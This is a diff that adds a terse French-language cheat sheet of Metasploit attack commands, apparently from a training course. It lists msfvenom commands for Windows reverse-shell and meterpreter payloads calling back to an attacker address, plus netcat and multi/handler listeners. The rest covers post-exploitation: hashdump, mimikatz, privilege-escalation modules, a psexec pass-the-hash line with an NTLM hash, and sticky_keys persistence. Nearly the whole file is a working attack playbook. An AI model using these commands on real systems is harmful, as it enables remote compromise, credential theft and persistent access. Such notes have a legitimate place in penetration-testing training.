@@ -1,0 +1,36 @@
+Générer poc lancement calculatrice
+	msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python
+
+reverse shell avec netcat
+	Générer poc reverse shell
+		msfvenom -p windows/shell_reverse_tcp LHOST=<votre_ip> LPORT=8888 -b "\x00" -f python
+	Mettre netcat en attente de connexion
+		nc -lvp 8888
+	
+	
+reverse shell avec meterpreter
+	Générer poc reverse shell meterpreter
+		msfvenom -p windows/meterpreter/reverse_tcp LHOST=<votre_ip> LPORT=8888 -b "\x00" -f python
+	
+	Mettre metasploit en attente de connexion
+		use multi/handler
+			set payload windows/meterpreter/reverse_tcp
+			set lhost <votre_ip>
+			set lport 8888
+			exploit
+			
+screenshot
+
+
+hashdump
+load mimikatz
+
+
+use post/multi/recon/local_exploit_suggester
+use exploit/windows/local/tokenmagic
+
+use exploit/windows/smb/psexec
+formation:aad3b435b51404eeaad3b435b51404ee:6597d9fe8469e21d840e2cbff8d43c8b
+
+persistence 
+sticky_keys
